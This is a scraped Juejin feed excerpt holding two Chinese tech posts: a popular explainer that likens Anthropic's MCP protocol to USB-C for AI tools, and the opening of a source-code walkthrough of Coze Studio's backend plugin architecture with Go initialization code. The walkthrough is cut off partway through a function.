pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>各位在互联网圈子里摸爬滚打的朋友们，今年聊得最多的词，除了大模型，恐怕就是 <strong>“AI Agent”</strong>（AI 智能体）了。</p>
<p>大家都幻想着，未来有一个无所不能的 AI 助理，你一句话，它就能自动订机票、做报表、管理项目。但现实很骨感，我们今天用到的大多数 AI 应用，更像一个“博学的聊天伙伴”，而非“能干的办事员”。它能跟你从诗词歌赋聊到人生哲学，但你让它去公司的数据库里拉个上周的销售数据，它只会抱歉地告诉你：“对不起，我无法访问外部链接。”</p>
<p>为什么会这样？是我们的大模型不够聪明吗？</p>
<p>不是。问题出在连接上。<strong>一个再聪明的大脑，如果没有连接到手和脚，它就永远无法与物理世界互动。</strong> 而过去，给 AI 安装“手脚”的过程，堪称一场灾难。</p>
<h3 data-id="heading-0">一、混乱的“装修时代”：AI 集成的“土方法”</h3>
<p>我们不妨用一个装修的比喻来理解。</p>
<p>假设大模型是你刚买的超级智能中控“大脑”，你想让它控制家里的各种电器——灯、空调、数据库、公司的 ERP 系统等等。</p>
<p>在过去，没有统一标准。你想连一盏灯，需要请个电工，研究灯的电路，再拉一根专门的电线到“大脑”；你想连一台空调，又要请另一个师傅，再拉一根完全不同的线。每个新工具、新应用，都意味着一次**“定制化施工”**。</p>
<p>这带来了几个致命问题：</p>
<ul>
<li>
<p><strong>成本高、效率低</strong>：每个连接都是一个独立项目，需要专门的开发和维护，费时费力。</p>
</li>
<li>
<p><strong>兼容性差、极度脆弱</strong>：A 公司的 AI，换到 B 公司的工具上就得全部重做。系统稍微一升级，连接就可能断掉。</p>
</li>
<li>
<p><strong>安全风险大</strong>：为了让 AI 干活，你可能得给它开一个很大的权限口子，它能开灯，可能也能黑进你的电网。</p>
</li>
</ul>
<p>在这种“刀耕火种”的模式下，构建一个真正强大的 AI Agent，就像试图用几百种不同规格的零件去组装一辆汽车，过程极其痛苦，结果也往往不尽人意。</p>
<h3 data-id="heading-1">二、MCP：欢迎来到 AI 的“USB-C”时代</h3>
<p>现在，终于有人站出来说：“够了！别再各搞各的了，我们来定义一个统一的插座标准吧！”</p>
<p>这个站出来的人，是 Anthropic（Claude 模型的开发公司），他们提出的解决方案，就是 <strong>MCP（Model Context Protocol，模型上下文协议）</strong>。</p>
<p>你完全可以把它理解为——<strong>AI 世界的“USB-C”协议</strong>。</p>
<p><img src="https://cdn.gooo.ai/gen-images/b4728f09ffa1a719a38886a3dc3811fe2cbce091a15db3d92a0b5108b4fc5a68.png" alt="MCP USB-C Metaphor" loading="lazy"/></p>
<p>MCP 的核心思想极其简单粗暴：<strong>无论你是什么类型的“外部设备”（工具、数据库、API），也无论你是什么品牌的“AI 大脑”，我们之间都用一套标准化的语言和接口来对话。</strong></p>
<p>这套标准化的工作流程，用大白话讲，大概是这样的：</p>
<ol>
<li>
<p><strong>“握手”</strong>：AI 通过一个叫“客户端（Client）”的管家，和提供工具的“服务器（Server）”打个招呼，对一下暗号（协议版本）。</p>
</li>
<li>
<p><strong>“报菜名”</strong>：AI 问：“你这儿有啥我能用的？” 服务器立刻递上一份“能力清单”，上面写着：“我这里有‘查询天气’的工具、有‘公司员工通讯录’的资源、还有写‘周报’的模板。”</p>
</li>
<li>
<p><strong>“下指令”</strong>：AI 根据任务需要，选择一项能力，比如对管家说：“去，用‘查询天气’的工具，告诉我北京今天的天气。”</p>
</li>
<li>
<p><strong>“安全执行”</strong>：管家（客户端）确保这个指令是合规的、安全的，然后让服务器去执行，最后把结果拿回来给 AI。</p>
</li>
</ol>
<p>看到了吗？整个过程就像你把一个新买的 U 盘插进电脑。电脑自动识别出“这是一个存储设备”，然后你就可以在里面读写文件了。你完全不需要关心这个 U 盘的内部芯片是怎么设计的。</p>
<p><strong>这就是标准化的威力。MCP 把复杂、混乱的“定制化连接”，变成了简单、优雅的“即插即用”。</strong></p>
<h3 data-id="heading-2">三、这为什么关乎每个人的饭碗？</h3>
<p>技术细节我们点到为止，作为“懂业务的老司机”，我们更关心的是：这东西到底有什么用？它会如何改变潮水的方向？</p>
<p><strong>1. 对开发者和企业：疯狂的降本增效</strong></p>
<p>这一点最直接。有了 MCP，企业在开发 AI 应用时，将不再需要为每一个工具编写专用的“适配器”。</p>
<p><strong>这意味着开发成本和时间的指数级下降。</strong></p>
<p>过去做一个能对接公司内部 10 个系统的 AI 助理，可能需要一个团队吭哧吭哧搞半年。未来，可能只需要一个工程师，花几天时间，把这些系统“MCP 化”，就能让任何支持 MCP 的 AI 模型无缝接入。<strong>这是从手工作坊到工业化流水线的跨越。</strong></p>
<p><strong>2. 对行业生态：AI 的“App Store”时代来了</strong></p>
<p>还记得 iPhone 是如何成功的吗？App Store 功不可没。当成千上万的开发者可以基于一套统一的标准（iOS SDK）去创造应用时，生态就爆发了。</p>
<p>MCP 扮演的，正是“AI 工具”领域的 SDK 角色。</p>
<p><img src="https://cdn.gooo.ai/gen-images/21fdec1709660706ca4f63a26bdb6fa17ed190864846b5818ec6de2a4555f2f2.png" alt="AI Tool Ecosystem" loading="lazy"/></p>
<p>可以预见，未来会出现一个繁荣的“AI 工具市场”。专门提供数据库连接的、专门提供办公软件操作的、专门提供特定行业数据分析的……各种各样的“MCP-Ready”工具会像雨后春笋般涌现。<strong>AI 公司不用再重复造轮子，而是可以专注于优化自己的“大脑”，然后去这个“工具商店”里挑选“手和脚”进行组装。</strong></p>
<p><strong>3. 对未来：从“大脑”到“完全体”，Agent 的最后一块拼图</strong></p>
<p>MCP 真正打开的，是通往“自主 AI Agent”的大门。</p>
<p>它不仅让 AI 能调用外部工具，甚至还支持“双向能力”——也就是说，外部工具在需要的时候，也可以反过来请求 AI 的“算力”或“智慧”来完成任务。</p>
<p>这构建了一个协作网络。AI 不再是一个孤独的思考者，而是深度嵌入到我们数字化工作流中的一个“超级同事”。<strong>有了标准化的连接，AI Agent 才能真正走出实验室，成为我们业务流程中可靠、可扩展、可管理的关键一环。</strong></p>
<h3 data-id="heading-3">四、总结：别盯着浪花，要看懂潮水的方向</h3>
<p>总而言之，MCP 本身并不产生智能，它不写代码，也不做推理。</p>
<p><strong>但它建立了一个秩序。</strong> 它在当前 AI 领域一片喧嚣和混沌中，开始铺设最关键的基础设施——那条连接“智能”与“行动”的高速公路。</p>
<p>对于我们这些身处行业中的人来说，这意味着一个重要的风向标。当所有人的目光还聚焦在哪个模型又多考了几分时，底层的游戏规则可能已经变了。</p>
<p><strong>风口浪尖上，有人追逐浪花，有人修筑堤坝。MCP，就是那个定义潮水流向的堤坝工程。</strong> 关注它，理解它，你才能在下一波 AI 浪潮中，站得更稳。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[coze-studio源码分析(二)后端插件架构深度剖析与二次开发实战准备]]></title>    <link>https://juejin.cn/post/7580263284338016297</link>    <guid>https://juejin.cn/post/7580263284338016297</guid>    <pubDate>2025-12-06T14:08:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580263284338016297" data-draft-id="7580297762190311465" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="coze-studio源码分析(二)后端插件架构深度剖析与二次开发实战准备"/> <meta itemprop="keywords" content="Coze"/> <meta itemprop="datePublished" content="2025-12-06T14:08:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="DevYK"/> <meta itemprop="url" content="https://juejin.cn/user/3368559355637566"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            coze-studio源码分析(二)后端插件架构深度剖析与二次开发实战准备
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559355637566/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    DevYK
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T14:08:49.000Z" title="Sat Dec 06 2025 14:08:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">介绍</h2>
<p>Coze Studio 的插件系统是连接 AI 模型与外部服务的桥梁，允许 AI 通过 <strong>Function Calling</strong> 的方式调用外部工具和服务。插件系统本质上是对外部 API 的标准化封装，使 LLM 能够：</p>
<ul>
<li>🔍 <strong>获取实时数据</strong>：搜索、天气、新闻等</li>
<li>🛠️ <strong>执行操作</strong>：发送邮件、创建文件、远程命令执行等</li>
<li>🔗 <strong>集成第三方服务</strong>：数据库、云服务、MCP 服务器等</li>
</ul>
<blockquote>
<p>大家可以看到标题是插件分析和二次开发，对没错，想要二开插件就必须要知道整个 <code>coze</code> 插件的运转和执行流程，相当于为后续开发 MCP 插件奠定基础</p>
</blockquote>
<p>下面我们就一起来看下 coze-studio 整个插件系统的设计和 LLM 如何建立起关系的，我们就围绕这两点然后一步一步跟着源码深入进去</p>
<blockquote>
<p>注意：插件部分本小节只会对 Coze 是如何结合 HTTP 插件进行工作的做为抛砖引玉，MCP 和自定义需要自行去分析，当然 coze 官方还未对 mcp 进行实现，下一篇我们会对插件进行二次开发，将支持在前端配置 mcpservers ，感兴趣的可以先部署尝试</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/749ccc3856c94ad8b5129d5277b204ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGV2WUs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765634928&amp;x-signature=M8KkbQCPG5enBcX4k9jcBP6oYqs%3D" alt="image-20251205224615981" loading="lazy"/></p>
<p>Github: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyangkun19921001%2Fcoze-studio-plus" target="_blank" title="https://github.com/yangkun19921001/coze-studio-plus" ref="nofollow noopener noreferrer">github.com/yangkun1992…</a></p>
<p>如果觉得体验不错的，可以给一个小心心❤️</p>
</blockquote>
<h3 data-id="heading-1">核心概念</h3>
<p>目前插件是由以下几点构成</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abc8b226b88b4808a94d7eae3173f1b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGV2WUs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765634928&amp;x-signature=69PGPoWJ3OFfvCE0%2BPDaBkxU%2BmE%3D" alt="image-20251202225023049" loading="lazy"/></p>
<h4 data-id="heading-2">Plugin（插件）</h4>
<ul>
<li><strong>定义</strong>：一个插件代表一个外部服务或功能集合</li>
<li><strong>组成</strong>：包含多个 Tool（工具/API）</li>
<li><strong>元数据</strong>：包含名称、描述、图标、认证信息等</li>
</ul>
<h4 data-id="heading-3">Tool（工具/API）</h4>
<ul>
<li><strong>定义</strong>：插件中的一个具体功能接口</li>
<li><strong>描述</strong>：基于 OpenAPI 3.0 规范定义</li>
<li><strong>参数</strong>：支持 Header、Path、Query、Body 等多种参数位置</li>
</ul>
<h4 data-id="heading-4">Manifest（清单）</h4>
<ul>
<li><strong>定义</strong>：插件的配置清单，描述插件的元信息和 API 配置</li>
<li><strong>内容</strong>：包含插件类型、认证方式、公共参数等</li>
</ul>
<h3 data-id="heading-5">架构分层设计</h3>
<p>Coze Studio 插件系统保持与整个系统架构一样，还是采用分层架构设计，遵循 DDD（领域驱动设计）原则：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "API Layer"
        A[HTTP Handler]
        B[Application Service]
    end
    
    subgraph "Domain Layer"
        C[Plugin Service]
        D[Plugin Entity]
        E[Tool Entity]
        F[Repository Interface]
    end
    
    subgraph "Infrastructure Layer"
        G[Plugin Repository Impl]
        H[Tool Repository Impl]
        I[OAuth Repository Impl]
        J[Storage/OSS]
    end
    
    subgraph "Execution Layer"
        K[HTTP Invocation]
        L[MCP Invocation]
        M[Custom Invocation]
    end
    
    A --&gt; B
    B --&gt; C
    C --&gt; D
    C --&gt; E
    C --&gt; F
    F --&gt; G
    F --&gt; H
    F --&gt; I
    C --&gt; K
    C --&gt; L
    C --&gt; M
    K --&gt; J
</code></pre>
<p><strong>关键目录结构</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">backend/
├── api/                    <span class="hljs-comment"># API 层</span>
│   └── handler/            <span class="hljs-comment"># HTTP 处理器</span>
├── application/            <span class="hljs-comment"># 应用层</span>
│   └── plugin/            <span class="hljs-comment"># 插件应用服务</span>
├── domain/                 <span class="hljs-comment"># 领域层</span>
│   └── plugin/
│       ├── entity/         <span class="hljs-comment"># 实体定义</span>
│       ├── service/        <span class="hljs-comment"># 领域服务</span>
│       │   └── tool/       <span class="hljs-comment"># 工具执行实现</span>
│       ├── repository/     <span class="hljs-comment"># 仓储接口</span>
│       └── conf/           <span class="hljs-comment"># 配置加载</span>
└── crossdomain/            <span class="hljs-comment"># 跨域层</span>
    └── plugin/             <span class="hljs-comment"># 插件跨域接口</span>
</code></pre>
<hr/>
<h2 data-id="heading-6">插件类型体系</h2>
<p>目前 coze 还不支持 mcp ,但是下一篇将介绍如何基于 coze-studio 支持 mcp server 配置，所以本节主要介绍一个 HTTP 插件为主，因为原理都大同小异</p>
<h3 data-id="heading-7">插件类型定义</h3>
<p>Coze Studio 支持三种插件类型，定义在 <code>backend/crossdomain/plugin/consts/consts.go</code>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/350fc350331d4f7ca0995c74feb9f2fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGV2WUs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765634928&amp;x-signature=hnZRb%2FLy%2FMUKYsRNIRezuRrZov8%3D" alt="image-20251202225252362" loading="lazy"/></p>
<h3 data-id="heading-8">插件类型对比</h3>

































<table><thead><tr><th>类型</th><th>常量值</th><th>描述</th><th>使用场景</th><th>执行方式</th></tr></thead><tbody><tr><td><strong>OpenAPI Plugin</strong></td><td><code>openapi</code></td><td>标准 HTTP RESTful API</td><td>传统 Web API 集成</td><td>HTTP 请求</td></tr><tr><td><strong>MCP Plugin</strong></td><td><code>coze-studio-mcp</code></td><td>Model Context Protocol</td><td>连接 MCP 服务器、实时数据源</td><td>MCP 协议调用</td></tr><tr><td><strong>Custom Plugin</strong></td><td><code>coze-studio-custom</code></td><td>自定义内部逻辑</td><td>内置功能、特殊处理</td><td>注册的自定义处理器</td></tr></tbody></table>
<h4 data-id="heading-9">OpenAPI Plugin（HTTP 插件）</h4>
<ul>
<li><strong>特点</strong>：基于 OpenAPI 3.0 规范</li>
<li><strong>执行</strong>：通过 HTTP 客户端发送 RESTful 请求</li>
<li><strong>认证</strong>：支持 OAuth、API Key、Service Token 等</li>
<li><strong>适用</strong>：大多数第三方 Web API</li>
</ul>
<h4 data-id="heading-10">MCP Plugin（MCP 插件）</h4>
<ul>
<li><strong>特点</strong>：基于 Model Context Protocol</li>
<li><strong>执行</strong>：通过 MCP 客户端调用工具</li>
<li><strong>配置</strong>：在 Manifest 的 <code>api.extensions.mcp_config</code> 中配置</li>
<li><strong>适用</strong>：需要实时连接、流式数据的场景</li>
</ul>
<h4 data-id="heading-11">Custom Plugin（自定义插件）</h4>
<ul>
<li><strong>特点</strong>：内部自定义逻辑</li>
<li><strong>执行</strong>：通过注册的自定义处理器</li>
<li><strong>注册</strong>：使用 <code>tool.RegisterCustomTool()</code> 注册</li>
<li><strong>适用</strong>：系统内置功能、特殊业务逻辑</li>
</ul>
<h2 data-id="heading-12">后端插件加载流程</h2>
<h3 data-id="heading-13">初始化流程</h3>
<p>插件系统的初始化在应用启动时进行，流程如下：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Main
    participant AppInit
    participant PluginInit
    participant ConfInit
    participant LoadMeta
    
    Main-&gt;&gt;AppInit: Init()
    AppInit-&gt;&gt;PluginInit: InitService()
    PluginInit-&gt;&gt;ConfInit: InitConfig()
    ConfInit-&gt;&gt;LoadMeta: loadPluginProductMeta()
    LoadMeta-&gt;&gt;LoadMeta: 读取 YAML 元数据
    LoadMeta-&gt;&gt;LoadMeta: 解析 OpenAPI 文档
    LoadMeta-&gt;&gt;LoadMeta: 验证并注册插件
    LoadMeta--&gt;&gt;ConfInit: 插件产品信息
    ConfInit--&gt;&gt;PluginInit: 初始化完成
    PluginInit--&gt;&gt;AppInit: 服务就绪
</code></pre>
<p><strong>关键代码路径</strong>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d322d0227a44897994e8fe7eb2ba681~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRGV2WUs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765634928&amp;x-signature=4msrXYukDzoj3fLbmGHVLzGdSco%3D" alt="image-20251205224920685" loading="lazy"/></p>
<ol>
<li><strong>应用初始化</strong>：<code>backend/application/application.go::Init()</code></li>
<li><strong>插件服务初始化</strong>：<code>backend/application/plugin/init.go::InitService()</code></li>
<li><strong>配置初始化</strong>：<code>backend/domain/plugin/conf/config.go::InitConfig()</code></li>
<li><strong>元数据加载</strong>：<code>backend/domain/plugin/conf/load_plugin.go::loadPluginProductMeta()</code></li>
</ol>
<p><strong>核心代码详解</strong>：</p>
<h4 data-id="heading-14">1. 应用层初始化</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// backend/application/application.go</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Init</span><span class="hljs-params">(ctx context.Context)</span></span> (err <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// ... 其他初始化 ...</span>
    
    <span class="hljs-comment">// 初始化主服务（包含插件服务）</span>
    primaryServices, err := initPrimaryServices(ctx, basicServices)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">"Init - initPrimaryServices failed, err: %v"</span>, err)
    }
    
    <span class="hljs-comment">// ...</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">initPrimaryServices</span><span class="hljs-params">(ctx context.Context, basicServices *basicServices)</span></span> (*primaryServices, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 初始化插件服务</span>
    pluginSVC, err := plugin.InitService(ctx, basicServices.toPluginServiceComponents())
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    
    <span class="hljs-comment">// ...</span>
    <span class="hljs-keyword">return</span> &amp;primaryServices{
        pluginSVC: pluginSVC,
        <span class="hljs-comment">// ...</span>
    }, <span class="hljs-literal">nil</span>
}
</code></pre>
<h4 data-id="heading-15">2. 插件服务初始化</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// backend/application/plugin/init.go</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitService</span><span class="hljs-params">(ctx context.Context, components *ServiceComponents)</span></span> (*PluginApplicationService, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 1. 初始化插件配置（加载产品元数据）</span>
    err := conf.InitConfig(ctx)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    
    <span class="hljs-comment">// 2. 创建仓储实现</span>
    toolRepo := repository.NewToolRepo(&amp;repository.ToolRepoComponents{
        IDGen: components.IDGen,
        DB:    components.DB,
    })
    
    pluginRepo := repository.NewPluginRepo(&amp;repository.PluginRepoComponents{
        IDGen: components.IDGen,
        DB:    components.DB,
    })
    
    oauthRepo := repository.NewOAuthRepo(&amp;repository.OAuthRepoComponents{
        IDGen: components.IDGen,
        DB:    components.DB,
    })
    
    <span class="hljs-comment">// 3. 创建领域服务</span>
    pluginSVC := service.NewService(&amp;service.Components{
        IDGen:      components.IDGen,
        DB:         components.DB,
        OSS:        components.OSS,
        PluginRepo: pluginRepo,
        ToolRepo:   toolRepo,
        OAuthRepo:  oauthRepo,
    })
    
    <span class="hljs-comment">// 4. 检查产品插件 ID 是否与数据库中的草稿插件冲突</span>
    err = checkIDExist(ctx, pluginSVC)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    
    <span class="hljs-comment">// 5. 组装应用服务</span>
    PluginApplicationSVC.DomainSVC = pluginSVC
    PluginApplicationSVC.eventbus = components.EventBus
    PluginApplicationSVC.oss = components.OSS
    PluginApplicationSVC.userSVC = components.UserSVC
    PluginApplicationSVC.pluginRepo = pluginRepo
    PluginApplicationSVC.toolRepo = toolRepo
    
    <span class="hljs-keyword">return</span> PluginApplicationSVC, <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// 检查产品插件 ID 是否已存在于数据库中</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkIDExist</span><span class="hljs-params">(ctx context.Context, pluginService service.PluginService)</span></span> <span class="hljs-type">error</span> {
    <span class="hljs-comment">// 获取所有产品插件</span>
    pluginProducts := conf.GetAllPluginProducts()
    
    pluginIDs := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int64</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(pluginProducts))
    <span class="hljs-keyword">var</span> toolIDs []<span class="hljs-type">int64</span>
    <span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> pluginProducts {
        pluginIDs = <span class="hljs-built_in">append</span>(pluginIDs, p.Info.ID)
        toolIDs = <span class="hljs-built_in">append</span>(toolIDs, p.ToolIDs...)
    }
    
    <span class="hljs-comment">// 检查插件 ID 是否冲突</span>
    pluginInfos, err := pluginService.MGetDraftPlugins(ctx, pluginIDs)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> err
    }
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(pluginInfos) &gt; <span class="hljs-number">0</span> {
        <span class="hljs-comment">// 发现冲突，返回错误</span>
        conflictsIDs := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int64</span>, <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(pluginInfos))
        <span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> pluginInfos {
            conflictsIDs = <span class="hljs-built_in">append</span>(conflictsIDs, p.ID)
        }
        <span class="hljs-keyword">return</span> errorx.New(errno.ErrPluginIDExist, ...)
    }
    
    <span class="hljs-comment">// 检查工具 ID 是否冲突</span>
    tools, err := pluginService.MGetDraftTools(ctx, toolIDs)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> err
    }
